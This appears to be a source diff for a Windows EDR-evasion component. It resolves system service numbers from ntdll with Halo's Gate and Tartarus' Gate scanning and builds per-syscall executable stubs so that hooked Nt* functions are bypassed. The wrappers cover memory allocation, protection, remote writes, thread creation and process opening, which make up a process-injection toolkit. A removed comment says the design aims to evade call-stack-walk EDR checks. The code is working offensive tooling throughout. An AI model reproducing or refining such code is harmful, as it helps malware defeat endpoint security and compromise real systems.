@@ -67,6 +67,7 @@ typedef struct {
     DWORD rva;        /* RVA in ntdll                   */
     WORD  ssn;        /* resolved System Service Number */
     BOOL  resolved;   /* TRUE if ssn is valid           */
+    PVOID stub;       /* per-syscall stub with baked SSN */
 } gate_entry_t;
 
 static gate_entry_t  g_gate_table[GATE_MAX_EXPORTS];
@@ -74,21 +75,19 @@ static int           g_gate_count  = 0;
 static BOOL          g_gate_ready  = FALSE;
 
 /*
- * Our syscall gadget (placed in our own RWX allocation):
- *   4C 8B D1   mov r10, rcx
- *   0F 05      syscall
- *   C3         ret
+ * Per-syscall stubs — each entry gets its own 11-byte stub with the SSN
+ * baked into the machine code, eliminating the GATE_SET_SSN inline asm
+ * race where the compiler can clobber eax between the asm and the call
+ * at -O2 for functions with 5+ arguments.
  *
- * eax is set by the caller (the wrapper below) immediately before calling
- * this stub.  Because the return address points HERE and not into ntdll,
- * call-stack-walk EDR checks do not see a Nt* frame.
+ * Each stub:
+ *   B8 xx xx 00 00   mov eax, <SSN>
+ *   4C 8B D1         mov r10, rcx
+ *   0F 05            syscall
+ *   C3               ret
  */
-static const BYTE    g_syscall_stub_bytes[] = {
-    0x4C, 0x8B, 0xD1,   /* mov r10, rcx */
-    0x0F, 0x05,         /* syscall      */
-    0xC3                /* ret          */
-};
-static PVOID         g_syscall_addr = NULL;
+#define GATE_STUB_SIZE 11
+static BYTE *g_stub_page = NULL;
 
 /* ── Stub pattern recognition ───────────────────────────────────── */
 
@@ -340,10 +339,8 @@ static void gate_build_mem_index(HMODULE ntdll) {
         if (g_gate_table[i].resolved) continue;
         const BYTE *stub = base + g_gate_table[i].rva;
 
-        /* Both hook variants (full hook or Tartarus partial hook) */
         if (!gate_is_clean_stub(stub)) {
             for (int delta = 1; delta <= HALO_SCAN_RADIUS; delta++) {
-                /* Search forward */
                 if (i + delta < count) {
                     const BYTE *ns = base + g_gate_table[i + delta].rva;
                     if (gate_is_clean_stub(ns)) {
@@ -353,32 +350,7 @@ static void gate_build_mem_index(HMODULE ntdll) {
                         break;
                     }
                 }
-                /* Search backward */
                 if (i - delta >= 0) {
-                    const BYTE *ns = base + g_gate_table[i - delta].rva;
-                    if (gate_is_clean_stub(ns)) {
-                        WORD nsn = gate_read_ssn_from_stub(ns);
-                        g_gate_table[i].ssn      = (WORD)(nsn + delta);
-                        g_gate_table[i].resolved = TRUE;
-                        break;
-                    }
-                }
-                if (g_gate_table[i].resolved) break;
-            }
-        }
-        /* Tartarus' Gate: bytes 0-2 intact, bytes 3+ hooked */
-        else if (gate_is_tartarus_stub(stub)) {
-            for (int delta = 1; delta <= HALO_SCAN_RADIUS; delta++) {
-                if (i + delta < count) {
-                    const BYTE *ns = base + g_gate_table[i + delta].rva;
-                    if (gate_is_clean_stub(ns)) {
-                        WORD nsn = gate_read_ssn_from_stub(ns);
-                        g_gate_table[i].ssn      = (WORD)(nsn - delta);
-                        g_gate_table[i].resolved = TRUE;
-                        break;
-                    }
-                }
-                if (!g_gate_table[i].resolved && i - delta >= 0) {
                     const BYTE *ns = base + g_gate_table[i - delta].rva;
                     if (gate_is_clean_stub(ns)) {
                         WORD nsn = gate_read_ssn_from_stub(ns);
@@ -400,16 +372,6 @@ static void gate_build_mem_index(HMODULE ntdll) {
 static void gate_init(void) {
     if (g_gate_ready) return;
 
-    g_syscall_addr = VirtualAlloc(NULL, sizeof(g_syscall_stub_bytes),
-                                  MEM_COMMIT | MEM_RESERVE,
-                                  PAGE_READWRITE);
-    if (g_syscall_addr) {
-        memcpy(g_syscall_addr, g_syscall_stub_bytes, sizeof(g_syscall_stub_bytes));
-        DWORD old;
-        VirtualProtect(g_syscall_addr, sizeof(g_syscall_stub_bytes),
-                       PAGE_EXECUTE_READ, &old);
-    }
-
 #if SYSCALL_METHOD == 1
     gate_resolve_from_disk();
 #elif SYSCALL_METHOD == 2
@@ -418,17 +380,38 @@ static void gate_init(void) {
         if (ntdll) gate_build_mem_index(ntdll);
     }
 #else
-    /* AUTO: try disk first, then supplement with in-memory scan */
     if (!gate_resolve_from_disk()) {
         HMODULE ntdll = GetModuleHandleA("ntdll.dll");
         if (ntdll) gate_build_mem_index(ntdll);
     } else {
-        /* Disk resolved entries; still run mem scan to catch any
-           entries that were forwarders or missed in the file walk */
         HMODULE ntdll = GetModuleHandleA("ntdll.dll");
         if (ntdll) gate_build_mem_index(ntdll);
     }
 #endif
+
+    /* Generate per-syscall stubs with baked-in SSNs */
+    SIZE_T page_sz = (SIZE_T)g_gate_count * GATE_STUB_SIZE;
+    if (page_sz == 0) page_sz = 4096;
+    g_stub_page = (BYTE *)VirtualAlloc(NULL, page_sz,
+                                       MEM_COMMIT | MEM_RESERVE,
+                                       PAGE_READWRITE);
+    if (g_stub_page) {
+        for (int i = 0; i < g_gate_count; i++) {
+            if (!g_gate_table[i].resolved) continue;
+            BYTE *s = g_stub_page + (i * GATE_STUB_SIZE);
+            s[0] = 0xB8;                              /* mov eax, imm32 */
+            s[1] = (BYTE)(g_gate_table[i].ssn & 0xFF);
+            s[2] = (BYTE)((g_gate_table[i].ssn >> 8) & 0xFF);
+            s[3] = 0x00;
+            s[4] = 0x00;
+            s[5] = 0x4C; s[6] = 0x8B; s[7] = 0xD1;   /* mov r10, rcx  */
+            s[8] = 0x0F; s[9] = 0x05;                 /* syscall        */
+            s[10] = 0xC3;                              /* ret            */
+            g_gate_table[i].stub = (PVOID)s;
+        }
+        DWORD old;
+        VirtualProtect(g_stub_page, page_sz, PAGE_EXECUTE_READ, &old);
+    }
 
     g_gate_ready = TRUE;
 }
@@ -456,22 +439,18 @@ static WORD gate_get_ssn(const char *func_name) {
     return 0xFFFF; /* unresolved */
 }
 
-/* ── Indirect syscall dispatch ────────────────────────────────────
- *
- * Strategy: each Gate_Nt* wrapper function sets eax = SSN via inline
- * assembly, then calls g_syscall_addr (our RWX stub: mov r10,rcx;
- * syscall; ret).  We must set eax RIGHT BEFORE the call because the
- * compiler may clobber rax between the asm and the indirect call.
- *
- * We use a separate typed function pointer cast to invoke the stub so
- * that the C calling convention correctly places rcx/rdx/r8/r9/stack
- * arguments.  The inline asm just sets eax = SSN.
- *
- * Direct dispatch macro — sets rax then tail-calls the RWX stub:
- */
+/* ── Per-stub lookup by function name ────────────────────────────── */
 
-#define GATE_SET_SSN(ssn) \
-    __asm__ volatile ("movl %0, %%eax" : : "r"((DWORD)(ssn)) : "rax")
+static PVOID gate_get_stub(const char *func_name) {
+    for (int i = 0; i < g_gate_count; i++) {
+        if (strcmp(g_gate_table[i].name, func_name) == 0) {
+            if (g_gate_table[i].resolved && g_gate_table[i].stub)
+                return g_gate_table[i].stub;
+            break;
+        }
+    }
+    return NULL;
+}
 
 /* ── NT wrapper function definitions ────────────────────────────── */
 
@@ -483,18 +462,16 @@ static NTSTATUS Gate_NtAllocateVirtualMemory(
     HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
     PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
 {
-    pfn_NtAllocateVirtualMemory fn;
-    WORD ssn = gate_get_ssn("NtAllocateVirtualMemory");
-    if (ssn == 0xFFFF || !g_syscall_addr) {
-        fn = (pfn_NtAllocateVirtualMemory)
+    PVOID stub = gate_get_stub("NtAllocateVirtualMemory");
+    if (!stub) {
+        pfn_NtAllocateVirtualMemory fn = (pfn_NtAllocateVirtualMemory)
              GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
         if (fn) return fn(ProcessHandle, BaseAddress, ZeroBits,
                           RegionSize, AllocationType, Protect);
         return (NTSTATUS)0xC0000001L;
     }
-    fn = (pfn_NtAllocateVirtualMemory)g_syscall_addr;
-    GATE_SET_SSN(ssn);
-    return fn(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
+    return ((pfn_NtAllocateVirtualMemory)stub)(ProcessHandle, BaseAddress, ZeroBits,
+                                                RegionSize, AllocationType, Protect);
 }
 
 /* NtProtectVirtualMemory */
@@ -506,19 +483,16 @@ static NTSTATUS Gate_NtProtectVirtualMemory(
     PSIZE_T NumberOfBytesToProtect,
     ULONG NewAccessProtection, PULONG OldAccessProtection)
 {
-    pfn_NtProtectVirtualMemory fn;
-    WORD ssn = gate_get_ssn("NtProtectVirtualMemory");
-    if (ssn == 0xFFFF || !g_syscall_addr) {
-        fn = (pfn_NtProtectVirtualMemory)
+    PVOID stub = gate_get_stub("NtProtectVirtualMemory");
+    if (!stub) {
+        pfn_NtProtectVirtualMemory fn = (pfn_NtProtectVirtualMemory)
              GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
         if (fn) return fn(ProcessHandle, BaseAddress, NumberOfBytesToProtect,
                           NewAccessProtection, OldAccessProtection);
         return (NTSTATUS)0xC0000001L;
     }
-    fn = (pfn_NtProtectVirtualMemory)g_syscall_addr;
-    GATE_SET_SSN(ssn);
-    return fn(ProcessHandle, BaseAddress, NumberOfBytesToProtect,
-              NewAccessProtection, OldAccessProtection);
+    return ((pfn_NtProtectVirtualMemory)stub)(ProcessHandle, BaseAddress,
+              NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
 }
 
 /* NtWriteVirtualMemory */
@@ -529,18 +503,15 @@ static NTSTATUS Gate_NtWriteVirtualMemory(
     HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
     SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
 {
-    pfn_NtWriteVirtualMemory fn;
-    WORD ssn = gate_get_ssn("NtWriteVirtualMemory");
-    if (ssn == 0xFFFF || !g_syscall_addr) {
-        fn = (pfn_NtWriteVirtualMemory)
+    PVOID stub = gate_get_stub("NtWriteVirtualMemory");
+    if (!stub) {
+        pfn_NtWriteVirtualMemory fn = (pfn_NtWriteVirtualMemory)
              GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
         if (fn) return fn(ProcessHandle, BaseAddress, Buffer,
                           NumberOfBytesToWrite, NumberOfBytesWritten);
         return (NTSTATUS)0xC0000001L;
     }
-    fn = (pfn_NtWriteVirtualMemory)g_syscall_addr;
-    GATE_SET_SSN(ssn);
-    return fn(ProcessHandle, BaseAddress, Buffer,
+    return ((pfn_NtWriteVirtualMemory)stub)(ProcessHandle, BaseAddress, Buffer,
               NumberOfBytesToWrite, NumberOfBytesWritten);
 }
 
@@ -555,19 +526,16 @@ static NTSTATUS Gate_NtCreateThreadEx(
     ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
     SIZE_T MaximumStackSize, PVOID AttributeList)
 {
-    pfn_NtCreateThreadEx fn;
-    WORD ssn = gate_get_ssn("NtCreateThreadEx");
-    if (ssn == 0xFFFF || !g_syscall_addr) {
-        fn = (pfn_NtCreateThreadEx)
+    PVOID stub = gate_get_stub("NtCreateThreadEx");
+    if (!stub) {
+        pfn_NtCreateThreadEx fn = (pfn_NtCreateThreadEx)
              GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
         if (fn) return fn(ThreadHandle, DesiredAccess, ObjectAttributes,
                           ProcessHandle, StartRoutine, Argument, CreateFlags,
                           ZeroBits, StackSize, MaximumStackSize, AttributeList);
         return (NTSTATUS)0xC0000001L;
     }
-    fn = (pfn_NtCreateThreadEx)g_syscall_addr;
-    GATE_SET_SSN(ssn);
-    return fn(ThreadHandle, DesiredAccess, ObjectAttributes,
+    return ((pfn_NtCreateThreadEx)stub)(ThreadHandle, DesiredAccess, ObjectAttributes,
               ProcessHandle, StartRoutine, Argument, CreateFlags,
               ZeroBits, StackSize, MaximumStackSize, AttributeList);
 }
@@ -579,17 +547,14 @@ typedef NTSTATUS (WINAPI *pfn_NtWaitForSingleObject)(
 static NTSTATUS Gate_NtWaitForSingleObject(
     HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout)
 {
-    pfn_NtWaitForSingleObject fn;
-    WORD ssn = gate_get_ssn("NtWaitForSingleObject");
-    if (ssn == 0xFFFF || !g_syscall_addr) {
-        fn = (pfn_NtWaitForSingleObject)
+    PVOID stub = gate_get_stub("NtWaitForSingleObject");
+    if (!stub) {
+        pfn_NtWaitForSingleObject fn = (pfn_NtWaitForSingleObject)
              GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
         if (fn) return fn(Handle, Alertable, Timeout);
         return (NTSTATUS)0xC0000001L;
     }
-    fn = (pfn_NtWaitForSingleObject)g_syscall_addr;
-    GATE_SET_SSN(ssn);
-    return fn(Handle, Alertable, Timeout);
+    return ((pfn_NtWaitForSingleObject)stub)(Handle, Alertable, Timeout);
 }
 
 /* NtOpenProcess — custom struct to avoid winternl conflicts */
@@ -614,17 +579,14 @@ static NTSTATUS Gate_NtOpenProcess(
     PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
     GATE_OBJECT_ATTRIBUTES *ObjectAttributes, GATE_CLIENT_ID *ClientId)
 {
-    pfn_NtOpenProcess fn;
-    WORD ssn = gate_get_ssn("NtOpenProcess");
-    if (ssn == 0xFFFF || !g_syscall_addr) {
-        fn = (pfn_NtOpenProcess)
+    PVOID stub = gate_get_stub("NtOpenProcess");
+    if (!stub) {
+        pfn_NtOpenProcess fn = (pfn_NtOpenProcess)
              GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcess");
         if (fn) return fn(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
         return (NTSTATUS)0xC0000001L;
     }
-    fn = (pfn_NtOpenProcess)g_syscall_addr;
-    GATE_SET_SSN(ssn);
-    return fn(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
+    return ((pfn_NtOpenProcess)stub)(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
 }
 
 /* NtQuerySystemInformation */
@@ -635,18 +597,15 @@ static NTSTATUS Gate_NtQuerySystemInformation(
     ULONG SystemInformationClass, PVOID SystemInformation,
     ULONG SystemInformationLength, PULONG ReturnLength)
 {
-    pfn_NtQuerySystemInformation fn;
-    WORD ssn = gate_get_ssn("NtQuerySystemInformation");
-    if (ssn == 0xFFFF || !g_syscall_addr) {
-        fn = (pfn_NtQuerySystemInformation)
+    PVOID stub = gate_get_stub("NtQuerySystemInformation");
+    if (!stub) {
+        pfn_NtQuerySystemInformation fn = (pfn_NtQuerySystemInformation)
              GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
         if (fn) return fn(SystemInformationClass, SystemInformation,
                           SystemInformationLength, ReturnLength);
         return (NTSTATUS)0xC0000001L;
     }
-    fn = (pfn_NtQuerySystemInformation)g_syscall_addr;
-    GATE_SET_SSN(ssn);
-    return fn(SystemInformationClass, SystemInformation,
+    return ((pfn_NtQuerySystemInformation)stub)(SystemInformationClass, SystemInformation,
               SystemInformationLength, ReturnLength);
 }
 
@@ -800,10 +759,9 @@ static NTSTATUS Gate_NtCreateUserProcess(
     GATE_PS_CREATE_INFO  *CreateInfo,
     GATE_PS_ATTRIBUTE_LIST *AttributeList)
 {
-    pfn_NtCreateUserProcess fn;
-    WORD ssn = gate_get_ssn("NtCreateUserProcess");
-    if (ssn == 0xFFFF || !g_syscall_addr) {
-        fn = (pfn_NtCreateUserProcess)
+    PVOID stub = gate_get_stub("NtCreateUserProcess");
+    if (!stub) {
+        pfn_NtCreateUserProcess fn = (pfn_NtCreateUserProcess)
              GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateUserProcess");
         if (fn) return fn(ProcessHandle, ThreadHandle,
                           ProcessDesiredAccess, ThreadDesiredAccess,
@@ -812,9 +770,7 @@ static NTSTATUS Gate_NtCreateUserProcess(
                           ProcessParameters, CreateInfo, AttributeList);
         return (NTSTATUS)0xC0000001L;
     }
-    fn = (pfn_NtCreateUserProcess)g_syscall_addr;
-    GATE_SET_SSN(ssn);
-    return fn(ProcessHandle, ThreadHandle,
+    return ((pfn_NtCreateUserProcess)stub)(ProcessHandle, ThreadHandle,
               ProcessDesiredAccess, ThreadDesiredAccess,
               ProcessObjectAttributes, ThreadObjectAttributes,
               ProcessFlags, ThreadFlags,
